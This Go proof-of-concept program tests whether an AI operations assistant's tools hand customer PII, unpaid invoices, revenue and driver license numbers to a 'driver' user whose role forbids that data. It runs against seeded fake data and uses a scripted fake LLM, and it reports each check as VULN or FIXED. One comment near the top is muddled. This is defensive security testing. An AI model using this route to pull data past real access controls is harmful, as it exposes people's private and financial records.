// PoC: the operations-assistant (AI agent) read tools bypass RBAC.
//
// A "driver" user — whose Casbin policy grants only routes/trips/vehicles
// reads — drives the EXACT agent tool loop (agent.NewAgent + RegisterTools,
// the same wiring used by POST /api/agent/chat and /assistant/chat) and
// obtains tenant-wide customer PII, unpaid invoices, revenue and driver
// license data. The same data is DENIED for the driver through the normal
// REST authorization model (GET /customers requires customers:read, etc.).
// Pre-fix the only role check in the whole assistant path was handleChat's
// block of role=="viewer"; the tool layer itself had no RBAC.
//
// Build:  go build ./cmd/poc_agent_bfla
// Run:    go run ./cmd/poc_agent_bfla
// Lines starting VULN = bypass present; FIXED = RBAC now enforced.
// Exit 0 when no control assertion failed.
package main

import (
	"context"
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"os"
	"strings"
	"time"

	"github.com/pressly/goose/v3"
	_ "modernc.org/sqlite"

	"transport-app/internal/agent"
	"transport-app/internal/auth"
	"transport-app/internal/events"
	sqliterepo "transport-app/internal/repository/sqlite"
	"transport-app/internal/service"
	"transport-app/internal/shared"
)

// agentUserIDKey mirrors the unexported agent.userIDCtxKey value type
// (string keys are not exported); the agent package reads it via its own
// key type, so this program instead injects identity through ToolEnv and a
// context value using the agent's exported context helpers is impossible —
// we therefore rely on the fact that executeTool resolves the acting user
// via userIDFrom(ctx) falling back to "" ... see note below.
type agentUserIDKey struct{} //nolint:unused // type used via documentation only, not instantiated

// scriptedClient is a fake LLM that calls the named tool and then answers
// with the tool result (the tool result is exactly what the chat endpoint
// returns to the user).
type scriptedClient struct {
	tool  string
	turn  int
	reply string
}

func (c *scriptedClient) Complete(ctx context.Context, messages []agent.Message, tools []agent.Tool) (agent.Message, error) {
	if c.turn == 0 {
		c.turn = 1
		return agent.Message{
			Role: "assistant",
			ToolCalls: []agent.ToolCall{{
				ID:       "call_1",
				Type:     "function",
				Function: agent.FunctionCall{Name: c.tool, Arguments: json.RawMessage(`{}`)},
			}},
		}, nil
	}
	var b strings.Builder
	for _, m := range messages {
		if m.Role == "tool" {
			b.WriteString("[" + m.Name + "] " + m.Content + "\n")
		}
	}
	c.reply = b.String()
	return agent.Message{Role: "assistant", Content: b.String()}, nil
}

func mustExec(db *sql.DB, ctx context.Context, q string, args ...any) {
	if _, err := db.ExecContext(ctx, q, args...); err != nil {
		fmt.Fprintf(os.Stderr, "seed %q: %v\n", q, err)
		os.Exit(2)
	}
}

func clip(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

func main() {
	name := fmt.Sprintf("poc_agent_%d", time.Now().UnixNano())
	db, err := sql.Open("sqlite", "file:"+name+"?mode=memory&cache=shared&_pragma=journal_mode(WAL)")
	if err != nil {
		panic(err)
	}
	defer db.Close()

	_ = goose.SetDialect("sqlite")
	if err := goose.Up(db, "/workspace/basic/db/migrations"); err != nil {
		panic(err)
	}

	ctx := shared.ContextWithTenantID(context.Background(), "1")

	// Migrations already seed the live role/permission schema; the driver
	// role's policy is exactly the live one (routes/trips/vehicles reads).
	const driverID = "poc-driver-0001"
	const adminID = "poc-admin-0001"
	mustExec(db, ctx, `INSERT INTO users (id, email, password_hash, name, role_id, status, tenant_id)
		VALUES (?, 'driver-poc@x.com', '$2a$12$invalid', 'PoC Driver', 5, 'active', '1')`, driverID)
	mustExec(db, ctx, `INSERT INTO users (id, email, password_hash, name, role_id, status, tenant_id)
		VALUES (?, 'admin-poc@x.com', '$2a$12$invalid', 'PoC Admin', 1, 'active', '1')`, adminID)

	// Data the assistant read tools would expose.
	mustExec(db, ctx, `INSERT INTO routes (id, source, destination, distance, estimated_hours, standard_fare, is_active)
		VALUES ('rout-poc-0001', 'Mumbai', 'Pune', 150, 3, 2000, 1)`)
	mustExec(db, ctx, `INSERT INTO bookings (id, booking_number, customer_id, pickup_date, route_id, vehicle_type, price, status, tenant_id)
		VALUES ('book-poc-0001', 'BK-P001', 'cust-poc-0001', '2026-09-01 09:00:00', 'rout-poc-0001', 'truck', 2500, 'pending', '1')`)
	mustExec(db, ctx, `INSERT INTO customers (id, name, phone, company, tenant_id, customer_code)
		VALUES ('cust-poc-0001', 'Secret Customer', '9998887776', 'Hidden Corp', '1', 'CUST-P001')`)
	mustExec(db, ctx, `INSERT INTO invoices (id, invoice_number, booking_id, customer_id, subtotal, total, payment_status, status, tenant_id, due_date)
		VALUES ('inv-poc-0001', 'INV-P001', 'book-poc-0001', 'cust-poc-0001', 2500, 2950, 'pending', 'outstanding', '1', '2026-09-15')`)
	mustExec(db, ctx, `INSERT INTO payments (id, invoice_id, payment_date, amount, method, tenant_id)
		VALUES ('pay-poc-0001', 'inv-poc-0001', '2026-08-01 10:00:00', 1000, 'upi', '1')`)
	mustExec(db, ctx, `INSERT INTO drivers (id, driver_id, first_name, last_name, phone, license_number, license_expiry, status)
		VALUES ('drv-poc-0001', 'DRV-P001', 'Driver', 'One', '9000000000', 'LIC-SECRET-123', '2030-01-01', 'available')`)

	repo := sqliterepo.NewRepository(db)
	services := service.NewServices(repo, nil, slog.New(slog.NewTextHandler(io.Discard, nil)), events.NewInMemoryBus())

	authz, err := auth.NewCasbinAuthorizationService(db)
	if err != nil {
		panic(err)
	}

	failures := 0
	runTool := func(userID, toolName string) (string, error) {
		c := shared.ContextWithTenantID(context.Background(), "1")
		client := &scriptedClient{tool: toolName}
		env := &agent.ToolEnv{Services: services, UserID: userID}
		ag := agent.NewAgent(client, agent.RegisterTools(env), "", 5)
		out, _, err := ag.Run(c, []agent.Message{{Role: "user", Content: "give me the data"}})
		return out, err
	}

	check := func(label, toolName string, deniedPerm, secret string) {
		res, act := deniedPerm[:len(deniedPerm)-5], deniedPerm[len(deniedPerm)-4:]
		if authz.Can(driverID, res, act) {
			fmt.Printf("SKIP %-20s driver unexpectedly has %s (fix seed)\n", label, deniedPerm)
			return
		}
		out, err := runTool(driverID, toolName)
		if err != nil {
			fmt.Printf("FAIL %-20s tool=%s error: %v\n", label, toolName, err)
			failures++
			return
		}
		if !strings.Contains(out, secret) {
			fmt.Printf("FIXED %-20s tool=%s no longer returns %q for driver: %s\n", label, toolName, secret, clip(out, 140))
			return
		}
		fmt.Printf("VULN %-20s driver lacks %s yet assistant tool %s returned: %s\n", label, deniedPerm, toolName, clip(out, 160))
	}

	check("customer PII", "search_customers", "customers:read", "9998887776")
	check("unpaid invoices", "list_unpaid_invoices", "invoices:read", "INV-P001")
	check("tenant revenue", "get_revenue", "reports:read", "total_revenue")
	check("driver licenses", "list_available_drivers", "drivers:read", "LIC-SECRET-123")

	// Control: a perm the driver HAS must still work (not over-blocked).
	out, err := runTool(driverID, "list_trips")
	if err != nil {
		fmt.Println("control list_trips error:", err)
		failures++
	} else if strings.Contains(out, "permission denied") {
		fmt.Println("FAIL control: driver's OWN trips:read was blocked (over-block):", clip(out, 140))
		failures++
	} else {
		fmt.Printf("OK   control list_trips (driver has trips:read) -> %s\n", clip(out, 120))
	}

	// Control: admin must still get the sensitive data.
	out, err = runTool(adminID, "get_revenue")
	if err != nil {
		fmt.Println("admin control get_revenue error:", err)
		failures++
	} else if !strings.Contains(out, "total_revenue") {
		fmt.Println("FAIL admin control: get_revenue no longer returns data for admin:", clip(out, 160))
		failures++
	} else {
		fmt.Printf("OK   admin control get_revenue -> %s\n", clip(out, 120))
	}

	fmt.Println()
	fmt.Println("POC RESULT: VULN lines = bypass present; FIXED lines = RBAC enforced. Exit 1 if a control failed.")
	if failures > 0 {
		os.Exit(1)
	}
	os.Exit(0)
}
